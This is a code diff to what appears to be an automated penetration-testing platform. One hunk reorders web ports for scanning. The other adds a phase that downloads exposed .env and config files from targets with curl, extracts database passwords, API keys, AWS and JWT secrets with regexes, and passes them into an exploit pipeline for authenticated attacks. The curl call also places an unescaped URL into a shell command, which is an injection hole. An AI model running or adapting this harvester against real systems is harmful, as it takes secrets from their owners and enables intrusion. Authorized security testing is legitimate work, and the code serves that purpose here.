@@ -6600,11 +6600,35 @@ async function executeVulnDetection(state: EngagementOpsState, engagement: any, 
     }
 
     // Exclude our own infrastructure ports from scan scope
-    const INFRA_PORTS = new Set([1337, 31337, 8834, 9392, 5432, 3306, 27017, 6379]); // Burp, Sliver, Nessus, OpenVAS, DB ports
+    // NOTE: 1337 removed — it's commonly used by Node.js apps (e.g., Broken Crystals, Strapi)
+    const INFRA_PORTS = new Set([31337, 8834, 9392, 5432, 3306, 27017, 6379]); // Sliver, Nessus, OpenVAS, DB ports
+    // Expanded web port detection: include common non-standard HTTP ports
+    const COMMON_WEB_PORTS = new Set([80, 443, 8080, 8443, 3000, 3001, 5000, 5001, 8000, 8001, 8888, 9000, 9090, 1337, 4200, 4443]);
     const webPorts = webApp.ports.filter(p =>
-      (["http", "https"].includes(p.service) || [80, 443, 8080, 8443].includes(p.port))
+      (["http", "https", "http-proxy", "http-alt"].includes(p.service) || COMMON_WEB_PORTS.has(p.port))
       && !INFRA_PORTS.has(p.port)
     );
+
+    // ── Port Prioritization: primary app ports first, co-hosted services last ──
+    // Heuristic: ports 80/443 and ports matching the engagement target domain get priority.
+    // Co-hosted services (Nextcloud on 8443, Gitea on 3000, etc.) are deprioritized.
+    const CO_HOSTED_INDICATORS = ['nextcloud', 'gitea', 'gitlab', 'grafana', 'prometheus', 'portainer', 'traefik', 'phpmyadmin'];
+    const isCoHostedPort = (port: typeof webPorts[0]): boolean => {
+      const version = (port.version || '').toLowerCase();
+      const service = (port.service || '').toLowerCase();
+      return CO_HOSTED_INDICATORS.some(ind => version.includes(ind) || service.includes(ind));
+    };
+    webPorts.sort((a, b) => {
+      // Primary ports (80, 443) first
+      const aPrimary = (a.port === 80 || a.port === 443) ? 0 : 1;
+      const bPrimary = (b.port === 80 || b.port === 443) ? 0 : 1;
+      if (aPrimary !== bPrimary) return aPrimary - bPrimary;
+      // Co-hosted services last
+      const aCoHosted = isCoHostedPort(a) ? 1 : 0;
+      const bCoHosted = isCoHostedPort(b) ? 1 : 0;
+      if (aCoHosted !== bCoHosted) return aCoHosted - bCoHosted;
+      return a.port - b.port;
+    });
 
     // ── Training Lab Port Filtering: only scan ports that returned 200 during httpx ──
     // This prevents wasting time on ports that serve 404 (wrong vhost) or are firewalled.
@@ -8961,6 +8985,134 @@ async function executeExploitation(state: EngagementOpsState, engagement: any, o
     addLog(state, { phase: 'exploitation', type: 'info', title: '🧠 Learning Engine Hydrated', detail: 'Loaded historical exploit patterns and chains from database for cross-engagement memory.' });
   } catch (hydrateErr: any) {
     console.warn(`[ExploitLearning] Hydration failed: ${hydrateErr.message}`);
+  }
+
+  // ── Pre-exploitation: Credential Harvesting from Info-Disclosure Vulns ──
+  // When nuclei finds exposed .env, config files, or info-disclosure vulns,
+  // auto-download and parse them to extract credentials for the exploit phase.
+  try {
+    const harvestStart = Date.now();
+    let harvestedCreds = 0;
+    for (const asset of state.assets) {
+      // Find info-disclosure vulns that likely contain credentials
+      const infoDisclosureVulns = asset.vulns.filter(v => {
+        const title = (v.title || '').toLowerCase();
+        const desc = (v.description || '').toLowerCase();
+        return (
+          title.includes('.env') || title.includes('env file') ||
+          title.includes('config') || title.includes('configuration') ||
+          title.includes('backup') || title.includes('.bak') ||
+          title.includes('exposed') || title.includes('disclosure') ||
+          title.includes('git-config') || title.includes('.git/') ||
+          title.includes('phpinfo') || title.includes('debug') ||
+          title.includes('credentials') || title.includes('password') ||
+          title.includes('api-key') || title.includes('token') ||
+          title.includes('wp-config') || title.includes('database') ||
+          desc.includes('credentials') || desc.includes('password') ||
+          desc.includes('api key') || desc.includes('secret')
+        );
+      });
+
+      if (infoDisclosureVulns.length === 0) continue;
+
+      for (const vuln of infoDisclosureVulns.slice(0, 10)) {
+        // Extract the URL from evidence or construct from vuln data
+        let targetUrl: string | undefined;
+        try {
+          const evidence = typeof (vuln as any).rawEvidence === 'string'
+            ? JSON.parse((vuln as any).rawEvidence)
+            : (vuln as any).rawEvidence;
+          targetUrl = evidence?.request?.url || evidence?.matchedAt;
+        } catch { /* not JSON */ }
+
+        if (!targetUrl) {
+          // Try to construct URL from vuln title (nuclei often includes the path)
+          const pathMatch = vuln.title.match(/\/([\.\w\-\/]+(?:\.env|\.config|\.bak|\.json|\.yml|\.yaml|\.xml|\.php|\.conf))/i);
+          if (pathMatch) {
+            const webPort = asset.ports.find(p => ['http', 'https'].includes(p.service) || [80, 443, 8080, 8443].includes(p.port));
+            const proto = webPort?.port === 443 || webPort?.port === 8443 ? 'https' : 'http';
+            const portSuffix = webPort && webPort.port !== 80 && webPort.port !== 443 ? `:${webPort.port}` : '';
+            targetUrl = `${proto}://${asset.hostname}${portSuffix}/${pathMatch[1]}`;
+          }
+        }
+
+        if (!targetUrl || !scanServerHost) continue;
+
+        try {
+          const { executeRawCommand } = await import('./scan-server-executor');
+          // Download the exposed file (timeout 15s, max 50KB)
+          const curlResult = await executeRawCommand(
+            `curl -sS -k --max-filesize 51200 --connect-timeout 10 -L '${targetUrl}' 2>&1 | head -c 51200`,
+            15
+          );
+          const content = typeof curlResult === 'string' ? curlResult : (curlResult?.stdout || '');
+          if (!content || content.length < 5) continue;
+
+          // Parse credentials from the downloaded content
+          const credPatterns = [
+            // .env style: KEY=value
+            /(?:DB_PASSWORD|DATABASE_PASSWORD|MYSQL_PASSWORD|POSTGRES_PASSWORD|REDIS_PASSWORD|SECRET_KEY|API_KEY|APP_SECRET|JWT_SECRET|AWS_SECRET_ACCESS_KEY|STRIPE_SECRET|MAIL_PASSWORD|SMTP_PASSWORD|ADMIN_PASSWORD)\s*=\s*['"]?([^\s'"\n]+)/gi,
+            // Connection strings
+            /(?:mysql|postgres|mongodb|redis):\/\/([^:]+):([^@]+)@/gi,
+            // PHP config: 'password' => 'value'
+            /['"](?:password|passwd|secret|api_key|apikey|token)['"]\s*(?:=>|:)\s*['"]([^'"]+)['"]/gi,
+            // YAML: password: value
+            /(?:password|secret|api_key|token):\s*['"]?([^\s'"\n]{4,})/gi,
+          ];
+
+          const foundCreds: Array<{ type: string; key: string; value: string; source: string }> = [];
+          for (const pattern of credPatterns) {
+            let match;
+            while ((match = pattern.exec(content)) !== null) {
+              // For connection string pattern, capture user:pass
+              if (match[2]) {
+                foundCreds.push({ type: 'db_credential', key: match[1], value: match[2], source: targetUrl });
+              } else if (match[1] && match[1].length >= 4 && match[1] !== 'null' && match[1] !== 'undefined' && match[1] !== 'changeme') {
+                const keyName = match[0].split(/[=:>]/)[0].replace(/['"]|\s/g, '').trim();
+                foundCreds.push({ type: 'env_credential', key: keyName, value: match[1], source: targetUrl });
+              }
+            }
+          }
+
+          if (foundCreds.length > 0) {
+            harvestedCreds += foundCreds.length;
+            // Store harvested credentials on the asset for exploitation
+            if (!asset.confirmedCredentials) asset.confirmedCredentials = [];
+            for (const cred of foundCreds) {
+              asset.confirmedCredentials.push({
+                service: 'harvested',
+                protocol: 'info-disclosure',
+                username: cred.key,
+                password: cred.value,
+                source: `credential-harvest:${cred.source}`,
+                confirmedAt: Date.now(),
+              } as any);
+            }
+
+            addLog(state, {
+              phase: 'exploitation', type: 'info',
+              title: `🔑 Credential Harvest: ${asset.hostname} — ${foundCreds.length} credentials extracted`,
+              detail: `Source: ${vuln.title}\nURL: ${targetUrl}\nCredentials found: ${foundCreds.map(c => `${c.key}=***`).join(', ')}\nThese will be injected into the exploit pipeline for authenticated attacks.`,
+              data: { credCount: foundCreds.length, source: targetUrl, vulnTitle: vuln.title },
+            });
+          }
+        } catch (harvestErr: any) {
+          // Credential harvesting is best-effort
+          console.warn(`[CredHarvest] Failed for ${targetUrl}: ${harvestErr.message}`);
+        }
+      }
+    }
+
+    if (harvestedCreds > 0) {
+      addLog(state, {
+        phase: 'exploitation', type: 'info',
+        title: `🔑 Credential Harvesting Complete: ${harvestedCreds} credentials from info-disclosure vulns`,
+        detail: `Automatically downloaded and parsed exposed config files (.env, database configs, etc.) to extract credentials. These are now available for authenticated exploitation.`,
+        data: { totalHarvested: harvestedCreds, durationMs: Date.now() - harvestStart },
+      });
+    }
+  } catch (credHarvestErr: any) {
+    console.warn(`[CredHarvest] Credential harvesting phase failed (non-fatal): ${credHarvestErr.message}`);
   }
 
   // ── Pre-exploitation memory relief ──
